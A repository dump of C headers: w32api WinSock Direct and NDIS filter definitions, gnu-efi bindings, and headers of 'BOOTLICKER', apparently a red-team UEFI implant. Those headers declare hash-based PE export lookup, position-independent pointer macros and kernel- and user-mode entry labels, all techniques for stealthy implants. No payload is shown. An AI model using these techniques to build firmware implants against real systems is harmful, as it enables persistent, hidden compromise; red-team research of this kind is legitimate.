 * WinSock Direct (SAN) support
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define _WS2SAN_H_

#ifdef __cplusplus
extern "C" {
#endif

#define SO_MAX_RDMA_SIZE                  0x700D
#define SO_RDMA_THRESHOLD_SIZE            0x700E

#define MEM_READ                          1
#define MEM_WRITE                         2
#define MEM_READWRITE                     3

#define WSAID_REGISTERMEMORY \
  {0xC0B422F5, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#define WSAID_DEREGISTERMEMORY \
  {0xC0B422F6, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#define WSAID_REGISTERRDMAMEMORY \
  {0xC0B422F7, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#define WSAID_DEREGISTERRDMAMEMORY \
  {0xC0B422F8, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#define WSAID_RDMAWRITE \
  {0xC0B422F9, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#define WSAID_RDMAREAD \
  {0xC0B422FA, 0xF58C, 0x11d1, {0xAD, 0x6C, 0x00, 0xC0, 0x4F, 0xA3, 0x4A, 0x2D}}

#if(_WIN32_WINNT >= 0x0501)
#define WSAID_MEMORYREGISTRATIONCACHECALLBACK \
  {0xE5DA4AF8, 0xD824, 0x48CD, {0xA7, 0x99, 0x63, 0x37, 0xA9, 0x8E, 0xD2, 0xAF}}
#endif

typedef struct _WSPUPCALLTABLEEX {
  LPWPUCLOSEEVENT lpWPUCloseEvent;
  LPWPUCLOSESOCKETHANDLE lpWPUCloseSocketHandle;
  LPWPUCREATEEVENT lpWPUCreateEvent;
  LPWPUCREATESOCKETHANDLE lpWPUCreateSocketHandle;
  LPWPUFDISSET lpWPUFDIsSet;
  LPWPUGETPROVIDERPATH lpWPUGetProviderPath;
  LPWPUMODIFYIFSHANDLE lpWPUModifyIFSHandle;
  LPWPUPOSTMESSAGE lpWPUPostMessage;
  LPWPUQUERYBLOCKINGCALLBACK lpWPUQueryBlockingCallback;
  LPWPUQUERYSOCKETHANDLECONTEXT lpWPUQuerySocketHandleContext;
  LPWPUQUEUEAPC lpWPUQueueApc;
  LPWPURESETEVENT lpWPUResetEvent;
  LPWPUSETEVENT lpWPUSetEvent;
  LPWPUOPENCURRENTTHREAD lpWPUOpenCurrentThread;
  LPWPUCLOSETHREAD lpWPUCloseThread;
  LPWPUCOMPLETEOVERLAPPEDREQUEST lpWPUCompleteOverlappedRequest;
} WSPUPCALLTABLEEX, FAR *LPWSPUPCALLTABLEEX;

typedef struct _WSABUFEX {
  u_long len;
  char FAR *buf;
  HANDLE handle;
} WSABUFEX, FAR * LPWSABUFEX;

typedef int
(WSPAPI *LPWSPSTARTUPEX)(
  IN WORD wVersionRequested,
  OUT LPWSPDATA lpWSPData,
  IN LPWSAPROTOCOL_INFOW lpProtocolInfo,
  IN LPWSPUPCALLTABLEEX lpUpcallTable,
  OUT LPWSPPROC_TABLE lpProcTable);

typedef HANDLE
(WSPAPI *LPFN_WSPREGISTERMEMORY)(
  IN SOCKET s,
  IN PVOID lpBuffer,
  IN DWORD dwBufferLength,
  IN DWORD dwFlags,
  OUT LPINT lpErrno);

typedef int
(WSPAPI *LPFN_WSPDEREGISTERMEMORY)(
  IN SOCKET s,
  IN HANDLE Handle,
  OUT LPINT lpErrno);

typedef int
(WSPAPI *LPFN_WSPREGISTERRDMAMEMORY)(
  IN SOCKET s,
  IN PVOID lpBuffer,
  IN DWORD dwBufferLength,
  IN DWORD dwFlags,
  OUT LPVOID lpRdmaBufferDescriptor,
  IN OUT LPDWORD lpdwDescriptorLength,
  OUT LPINT lpErrno);

typedef int
(WSPAPI *LPFN_WSPDEREGISTERRDMAMEMORY)(
  IN SOCKET s,
  IN LPVOID lpRdmaBufferDescriptor,
  IN DWORD dwDescriptorLength,
  OUT LPINT lpErrno);

typedef int
(WSPAPI *LPFN_WSPRDMAWRITE)(
  IN SOCKET s,
  IN LPWSABUFEX lpBuffers,
  IN DWORD dwBufferCount,
  IN LPVOID lpTargetBufferDescriptor,
  IN DWORD dwTargetDescriptorLength,
  IN DWORD dwTargetBufferOffset,
  OUT LPDWORD lpdwNumberOfBytesWritten,
  IN DWORD dwFlags,
  IN LPWSAOVERLAPPED lpOverlapped OPTIONAL,
  IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine OPTIONAL,
  IN LPWSATHREADID lpThreadId,
  OUT LPINT lpErrno);

typedef int
(WSPAPI *LPFN_WSPRDMAREAD)(
  IN SOCKET s,
  IN LPWSABUFEX lpBuffers,
  IN DWORD dwBufferCount,
  IN LPVOID lpTargetBufferDescriptor,
  IN DWORD dwTargetDescriptorLength,
  IN DWORD dwTargetBufferOffset,
  OUT LPDWORD lpdwNumberOfBytesRead,
  IN DWORD dwFlags,
  IN LPWSAOVERLAPPED lpOverlapped OPTIONAL,
  IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine OPTIONAL,
  IN LPWSATHREADID lpThreadId,
  OUT LPINT lpErrno);

#if(_WIN32_WINNT >= 0x0501)
typedef int
(WSPAPI *LPFN_WSPMEMORYREGISTRATIONCACHECALLBACK)(
  IN PVOID lpvAddress,
  IN SIZE_T Size,
  OUT LPINT lpErrno);
#endif

int
WSPAPI
WSPStartupEx(
  IN WORD wVersionRequested,
  OUT LPWSPDATA lpWSPData,
  IN LPWSAPROTOCOL_INFOW lpProtocolInfo,
  IN LPWSPUPCALLTABLEEX lpUpcallTable,
  OUT LPWSPPROC_TABLE lpProcTable);

HANDLE
WSPAPI
WSPRegisterMemory(
  IN SOCKET s,
  IN PVOID lpBuffer,
  IN DWORD dwBufferLength,
  IN DWORD dwFlags,
  OUT LPINT lpErrno);

int
WSPAPI
WSPDeregisterMemory(
  IN SOCKET s,
  IN HANDLE Handle,
  OUT LPINT lpErrno);

int
WSPAPI
WSPRegisterRdmaMemory(
  IN SOCKET s,
  IN PVOID lpBuffer,
  IN DWORD dwBufferLength,
  IN DWORD dwFlags,
  OUT LPVOID lpRdmaBufferDescriptor,
  IN OUT LPDWORD lpdwDescriptorLength,
  OUT LPINT lpErrno);

int
WSPAPI
WSPDeregisterRdmaMemory(
  IN SOCKET s,
  IN LPVOID lpRdmaBufferDescriptor,
  IN DWORD dwDescriptorLength,
  OUT LPINT lpErrno);

int
WSPAPI
WSPRdmaWrite(
  IN SOCKET s,
  IN LPWSABUFEX lpBuffers,
  IN DWORD dwBufferCount,
  IN LPVOID lpTargetBufferDescriptor,
  IN DWORD dwTargetDescriptorLength,
  IN DWORD dwTargetBufferOffset,
  OUT LPDWORD lpdwNumberOfBytesWritten,
  IN DWORD dwFlags,
  IN LPWSAOVERLAPPED lpOverlapped OPTIONAL,
  IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine OPTIONAL,
  IN LPWSATHREADID lpThreadId,
  OUT LPINT lpErrno);

int
WSPAPI
WSPRdmaRead(
  IN SOCKET s,
  IN LPWSABUFEX lpBuffers,
  IN DWORD dwBufferCount,
  IN LPVOID lpTargetBufferDescriptor,
  IN DWORD dwTargetDescriptorLength,
  IN DWORD dwTargetBufferOffset,
  OUT LPDWORD lpdwNumberOfBytesRead,
  IN DWORD dwFlags,
  IN LPWSAOVERLAPPED lpOverlapped OPTIONAL,
  IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine OPTIONAL,
  IN LPWSATHREADID lpThreadId,
  OUT LPINT lpErrno);

#if(_WIN32_WINNT >= 0x0501)
int
WSPAPI
WSPMemoryRegistrationCacheCallback(
  IN PVOID lpvAddress,
  IN SIZE_T Size,
  OUT LPINT lpErrno);
#endif

#ifdef __cplusplus
}
#endif

```

`include/ddk/xfilter.h`:

```h
/*
 * xfilter.h
 *
 * Address filtering for NDIS MACs
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _X_FILTER_DEFS_
#define _X_FILTER_DEFS_

#ifdef __cplusplus
extern "C" {
#endif

#define ETH_LENGTH_OF_ADDRESS             6

#define ETH_IS_BROADCAST(Address) \
  ((((PUCHAR)(Address))[0] == ((UCHAR)0xff)) && (((PUCHAR)(Address))[1] == ((UCHAR)0xff)))

#define ETH_IS_MULTICAST(Address) \
  (BOOLEAN)(((PUCHAR)(Address))[0] & ((UCHAR)0x01))

#define ETH_COMPARE_NETWORK_ADDRESSES(_A, _B, _Result) \
{ \
	if (*(ULONG UNALIGNED *)&(_A)[2] > *(ULONG UNALIGNED *)&(_B)[2]) \
	{ \
    *(_Result) = 1; \
	} \
	else if (*(ULONG UNALIGNED *)&(_A)[2] < *(ULONG UNALIGNED *)&(_B)[2]) \
	{ \
    *(_Result) = (UINT)-1; \
	} \
	else if (*(USHORT UNALIGNED *)(_A) > *(USHORT UNALIGNED *)(_B)) \
	{ \
    *(_Result) = 1; \
	} \
	else if (*(USHORT UNALIGNED *)(_A) < *(USHORT UNALIGNED *)(_B)) \
	{ \
	  *(_Result) = (UINT)-1; \
	} \
	else \
	{ \
	  *(_Result) = 0; \
	} \
}

#define ETH_COMPARE_NETWORK_ADDRESSES_EQ(_A,_B, _Result) \
{ \
	if ((*(ULONG UNALIGNED *)&(_A)[2] == *(ULONG UNALIGNED *)&(_B)[2]) && \
    (*(USHORT UNALIGNED *)(_A) == *(USHORT UNALIGNED *)(_B))) \
	{ \
    *(_Result) = 0; \
	} \
	else \
	{ \
    *(_Result) = 1; \
	} \
}

#define ETH_COPY_NETWORK_ADDRESS(_D, _S) \
{ \
	*((ULONG UNALIGNED *)(_D)) = *((ULONG UNALIGNED *)(_S)); \
	*((USHORT UNALIGNED *)((UCHAR *)(_D) + 4)) = *((USHORT UNALIGNED *)((UCHAR *)(_S) + 4)); \
}

#define FDDI_LENGTH_OF_LONG_ADDRESS       6
#define FDDI_LENGTH_OF_SHORT_ADDRESS      2

#define FDDI_IS_BROADCAST(Address, AddressLength, Result)   \
  *Result = ((*(PUCHAR)(Address) == (UCHAR)0xFF) && \
  (*((PUCHAR)(Address) + 1) == (UCHAR)0xFF))

#define FDDI_IS_MULTICAST(Address, AddressLength, Result) \
  *Result = (BOOLEAN)(*(UCHAR *)(Address) & (UCHAR)0x01)

#define FDDI_IS_SMT(FcByte, Result) \
{ \
  *Result = ((FcByte & ((UCHAR)0xf0)) == 0x40); \
}


#define FDDI_COMPARE_NETWORK_ADDRESSES(_A, _B, _Length, _Result) \
{ \
	if (*(USHORT UNALIGNED *)(_A) > *(USHORT UNALIGNED *)(_B)) \
	{ \
	  *(_Result) = 1; \
	} \
	else if (*(USHORT UNALIGNED *)(_A) < *(USHORT UNALIGNED *)(_B)) \
	{ \
	  *(_Result) = (UINT)-1; \
	} \
	else if (_Length == 2) \
	{ \
	  *(_Result) = 0; \
	} \
	else if (*(ULONG UNALIGNED *)((PUCHAR)(_A) + 2) > *(ULONG UNALIGNED *)((PUCHAR)(_B) + 2)) \
	{ \
	  *(_Result) = 1; \
	} \
	else if (*(ULONG UNALIGNED *)((PUCHAR)(_A) + 2) < *(ULONG UNALIGNED *)((PUCHAR)(_B) + 2)) \
	{ \
	  *(_Result) = (UINT)-1; \
	} \
	else \
	{ \
	  *(_Result) = 0; \
	} \
}

#define FDDI_COMPARE_NETWORK_ADDRESSES_EQ(_A, _B, _Length, _Result) \
{                                                                   \
	if ((*(USHORT UNALIGNED *)(_A) == *(USHORT UNALIGNED *)(_B)) && \
	  (((_Length) == 2) || \
	    (*(ULONG UNALIGNED *)((PUCHAR)(_A) + 2) == *(ULONG UNALIGNED *)((PUCHAR)(_B) + 2)))) \
	{ \
	  *(_Result) = 0; \
	} \
	else \
	{ \
	  *(_Result) = 1; \
	} \
}

#define FDDI_COPY_NETWORK_ADDRESS(D, S, AddressLength) \
{ \
	PCHAR _D = (D); \
	PCHAR _S = (S); \
	UINT _C = (AddressLength); \
	for ( ; _C > 0 ; _D++, _S++, _C--) \
	{ \
	  *_D = *_S; \
	} \
}

#define TR_LENGTH_OF_FUNCTIONAL           4
#define TR_LENGTH_OF_ADDRESS              6

typedef ULONG TR_FUNCTIONAL_ADDRESS;
typedef ULONG TR_GROUP_ADDRESS;

#define TR_IS_NOT_DIRECTED(_Address, _Result) \
{ \
  *(_Result) = (BOOLEAN)((_Address)[0] & 0x80); \
}

#define TR_IS_FUNCTIONAL(_Address, _Result) \
{ \
	*(_Result) = (BOOLEAN)(((_Address)[0] & 0x80) && !((_Address)[2] & 0x80)); \
}

#define TR_IS_GROUP(_Address, _Result) \
{ \
  *(_Result) = (BOOLEAN)((_Address)[0] & (_Address)[2] & 0x80); \
}

#define TR_IS_SOURCE_ROUTING(_Address, _Result) \
{ \
  *(_Result) = (BOOLEAN)((_Address)[0] & 0x80); \
}

#define TR_IS_MAC_FRAME(_PacketHeader) ((((PUCHAR)_PacketHeader)[1] & 0xFC) == 0)

#define TR_IS_BROADCAST(_Address, _Result) \
{ \
	*(_Result) = (BOOLEAN)(((*(UNALIGNED USHORT *)&(_Address)[0] == 0xFFFF) || \
		(*(UNALIGNED USHORT *)&(_Address)[0] == 0x00C0)) && \
		(*(UNALIGNED ULONG  *)&(_Address)[2] == 0xFFFFFFFF)); \
}

#define TR_COMPARE_NETWORK_ADDRESSES(_A, _B, _Result) \
{ \
	if (*(ULONG UNALIGNED *)&(_A)[2] > *(ULONG UNALIGNED *)&(_B)[2]) \
	{ \
	  *(_Result) = 1; \
	} \
	else if (*(ULONG UNALIGNED *)&(_A)[2] < *(ULONG UNALIGNED *)&(_B)[2]) \
	{ \
	  *(_Result) = (UINT)-1; \
	} \
	else if (*(USHORT UNALIGNED *)(_A) > *(USHORT UNALIGNED *)(_B)) \
	{ \
	  *(_Result) = 1; \
	} \
	else if (*(USHORT UNALIGNED *)(_A) < *(USHORT UNALIGNED *)(_B)) \
	{ \
	  *(_Result) = (UINT)-1; \
	} \
	else \
	{ \
	  *(_Result) = 0; \
	} \
}

#define TR_COPY_NETWORK_ADDRESS(_D, _S) \
{ \
	*((ULONG UNALIGNED *)(_D)) = *((ULONG UNALIGNED *)(_S)); \
	*((USHORT UNALIGNED *)((UCHAR *)(_D)+4)) = *((USHORT UNALIGNED *)((UCHAR *)(_S) + 4)); \
}

#define TR_COMPARE_NETWORK_ADDRESSES_EQ(_A, _B, _Result) \
{ \
	if ((*(ULONG UNALIGNED  *)&(_A)[2] == *(ULONG UNALIGNED  *)&(_B)[2]) && \
	    (*(USHORT UNALIGNED *)&(_A)[0] == *(USHORT UNALIGNED *)&(_B)[0])) \
	{ \
    *(_Result) = 0; \
	} \
	else \
	{ \
    *(_Result) = 1; \
	} \
}

#ifdef __cplusplus
}
#endif

#endif /* _X_FILTER_DEFS_ */

```

`include/global/Config.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/* Configuration file */
typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32		AddressOfEntrypoint;
	UINT32		AddressOfNewExeHeader;
} CONFIG, *PCONFIG ;

```

`include/global/Hash.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Returns a DJB2 hash representation of an input buffer
 * of the specified length. If no length is provided, it
 * assumes it is a NULL terminated string.
 *
!*/
D_SEC( H ) UINT32 HashString( _In_ PVOID Buffer, _In_ UINT32 Length );

```

`include/global/Labels.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

static ULONG_PTR EfClg( VOID );
static ULONG_PTR EfTbl( VOID );
static ULONG_PTR GetIp( VOID );
static ULONG_PTR KmEnt( VOID );
static ULONG_PTR UmEnt( VOID );
static ULONG_PTR UmTbl( VOID );
static ULONG_PTR KmTbl( VOID );

```

`include/global/Macros.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/* Gets a pointer to the function or string via its relative offset to GetIp() */
#define G_PTR( x )	( ULONG_PTR )( GetIp( ) - ( ( ULONG_PTR ) & GetIp - ( ULONG_PTR ) x ) )

/* Cast as a function or variable in a specific section */
#define D_SEC( x )	__attribute__(( section( ".text$" #x ) ))

/* CAst as a pointer with the specified typedef */
#define D_API( x )	__typeof__( x ) * x

/* Cast as a pointer-wide variable */
#define U_PTR( x )	( ( ULONG_PTR ) x )

/* Cast as a pointer */
#define C_PTR( x )	( ( PVOID ) x )

```

`include/global/Pe.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Searches for an export in a PE.
 *
!*/
D_SEC( H ) PVOID PeGetFuncEat( _In_ PVOID ImageBase, _In_ UINT32 ExportHash );

```

`include/gnu-efi/aarch64/efibind.h`:

```h
/*
 * Copright (C) 2014 - 2015 Linaro Ltd.
 * Author: Ard Biesheuvel <ard.biesheuvel@linaro.org>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice and this list of conditions, without modification.
 * 2. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * Alternatively, this software may be distributed under the terms of the
 * GNU General Public License as published by the Free Software Foundation;
 * either version 2 of the License, or (at your option) any later version.
 */

#if !defined(_MSC_VER) && (!defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L )) && !defined(__cplusplus)

// ANSI C 1999/2000 stdint.h integer width declarations

typedef unsigned long       uint64_t;
typedef long                int64_t;
typedef unsigned int        uint32_t;
typedef int                 int32_t;
typedef unsigned short      uint16_t;
typedef short               int16_t;
typedef unsigned char       uint8_t;
typedef signed char         int8_t;   // unqualified 'char' is unsigned on ARM
typedef uint64_t            uintptr_t;
typedef int64_t             intptr_t;

#else
#include <stdint.h>
#endif

//
// Basic EFI types of various widths
//

#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__ short
#endif

typedef uint64_t   UINT64;
typedef int64_t    INT64;

typedef uint32_t   UINT32;
typedef int32_t    INT32;

typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;

#undef VOID
#define VOID    void

typedef int64_t    INTN;
typedef uint64_t   UINTN;

#define EFIERR(a)           (0x8000000000000000 | a)
#define EFI_ERROR_MASK      0x8000000000000000
#define EFIERR_OEM(a)       (0xc000000000000000 | a)

#define BAD_POINTER         0xFBFBFBFBFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFFFFFFFFFF

#define BREAKPOINT()        while (TRUE);    // Make it hang on Bios[Dbg]32

//
// Pointers must be aligned to these address to function
//

#define MIN_ALIGNMENT_SIZE  8

#define ALIGN_VARIABLE(Value ,Adjustment) \
            (UINTN)Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment


//
// Define macros to build data structure signatures from characters.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))

//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code
//

#ifndef EFIAPI          // Forces EFI calling conventions reguardless of compiler options
#define EFIAPI          // Substitute expresion to force C calling convention
#endif

#define BOOTSERVICE
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION


#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE                volatile

#define MEMORY_FENCE            __sync_synchronize

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
#define EFI_DRIVER_ENTRY_POINT(InitFunction) \
    __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    InitializeDriver (                          \
        VOID    *ImageHandle,                   \
        VOID    *SystemTable                    \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle,        \
                SystemTable);                   \
    }                                           \
                                                \
    EFI_STATUS efi_main(                        \
        EFI_HANDLE image,                       \
        EFI_SYSTEM_TABLE *systab                \
        ) __attribute__((weak,                  \
                alias ("InitializeDriver")));
#endif

#define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
        (_if)->LoadInternal(type, name, entry)


//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.

#define INTERFACE_DECL(x) struct x

#define uefi_call_wrapper(func, va_num, ...) func(__VA_ARGS__)
#define EFI_FUNCTION

```

`include/gnu-efi/aarch64/efilibplat.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings




Revision History

--*/

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );


```

`include/gnu-efi/aarch64/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_AARCH64_SETJMP_H
#define GNU_EFI_AARCH64_SETJMP_H

#define JMPBUF_ALIGN 8

typedef struct {
	/* GP regs */
	UINT64	X19;
	UINT64	X20;
	UINT64	X21;
	UINT64	X22;
	UINT64	X23;
	UINT64	X24;
	UINT64	X25;
	UINT64	X26;
	UINT64	X27;
	UINT64	X28;
	UINT64	FP;
	UINT64	LR;
	UINT64	IP0;

	/* FP regs */
	UINT64	D8;
	UINT64	D9;
	UINT64	D10;
	UINT64	D11;
	UINT64	D12;
	UINT64	D13;
	UINT64	D14;
	UINT64	D15;
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_AARCH64_SETJMP_H */

```

`include/gnu-efi/arm/efibind.h`:

```h
/*
 * Copright (C) 2014 - 2015 Linaro Ltd.
 * Author: Ard Biesheuvel <ard.biesheuvel@linaro.org>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice and this list of conditions, without modification.
 * 2. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * Alternatively, this software may be distributed under the terms of the
 * GNU General Public License as published by the Free Software Foundation;
 * either version 2 of the License, or (at your option) any later version.
 */

#if !defined(_MSC_VER) && (!defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L )) && !defined(__cplusplus)

// ANSI C 1999/2000 stdint.h integer width declarations

typedef unsigned long long  uint64_t;
typedef long long           int64_t;
typedef unsigned int        uint32_t;
typedef int                 int32_t;
typedef unsigned short      uint16_t;
typedef short               int16_t;
typedef unsigned char       uint8_t;
typedef signed char         int8_t;   // unqualified 'char' is unsigned on ARM
typedef uint32_t            uintptr_t;
typedef int32_t             intptr_t;

#else
#include <stdint.h>
#endif

/*
 * This prevents GCC from emitting GOT based relocations, and use R_ARM_REL32
 * relative relocations instead, which are more suitable for static binaries.
 */
#if defined(__GNUC__) && !__STDC_HOSTED__
#pragma GCC visibility push (hidden)
#endif

//
// Basic EFI types of various widths
//

#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__ short
#endif

typedef uint64_t   UINT64;
typedef int64_t    INT64;

typedef uint32_t   UINT32;
typedef int32_t    INT32;

typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;

#undef VOID
#define VOID    void

typedef int32_t    INTN;
typedef uint32_t   UINTN;

#define EFIERR(a)           (0x80000000 | a)
#define EFI_ERROR_MASK      0x80000000
#define EFIERR_OEM(a)       (0xc0000000 | a)

#define BAD_POINTER         0xFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFF

#define BREAKPOINT()        while (TRUE);

//
// Pointers must be aligned to these address to function
//

#define MIN_ALIGNMENT_SIZE  4

#define ALIGN_VARIABLE(Value ,Adjustment) \
            (UINTN)Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment


//
// Define macros to build data structure signatures from characters.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))

//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code
//

#ifndef EFIAPI          // Forces EFI calling conventions reguardless of compiler options
#define EFIAPI          // Substitute expresion to force C calling convention
#endif

#define BOOTSERVICE
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION


#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE                volatile

#define MEMORY_FENCE            __sync_synchronize

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
#define EFI_DRIVER_ENTRY_POINT(InitFunction) \
    __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    InitializeDriver (                          \
        VOID    *ImageHandle,                   \
        VOID    *SystemTable                    \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle,        \
                SystemTable);                   \
    }                                           \
                                                \
    EFI_STATUS efi_main(                        \
        EFI_HANDLE image,                       \
        EFI_SYSTEM_TABLE *systab                \
        ) __attribute__((weak,                  \
                alias ("InitializeDriver")));
#endif

#define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
        (_if)->LoadInternal(type, name, entry)


//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.

#define INTERFACE_DECL(x) struct x

#define uefi_call_wrapper(func, va_num, ...) func(__VA_ARGS__)
#define EFI_FUNCTION

```

`include/gnu-efi/arm/efilibplat.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings




Revision History

--*/

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );


```

`include/gnu-efi/arm/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_ARM_SETJMP_H
#define GNU_EFI_ARM_SETJMP_H

#define JMPBUF_ALIGN 4

typedef struct {
	UINT32 R3; // A copy of R13
	UINT32 R4;
	UINT32 R5;
	UINT32 R6;
	UINT32 R7;
	UINT32 R8;
	UINT32 R9;
	UINT32 R10;
	UINT32 R11;
	UINT32 R12;
	UINT32 R13;
	UINT32 R14;
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_ARM_SETJMP_H */

```

`include/gnu-efi/efi.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efi.h

Abstract:

    Public EFI header files



Revision History

--*/


// Add a predefined macro to detect usage of the library
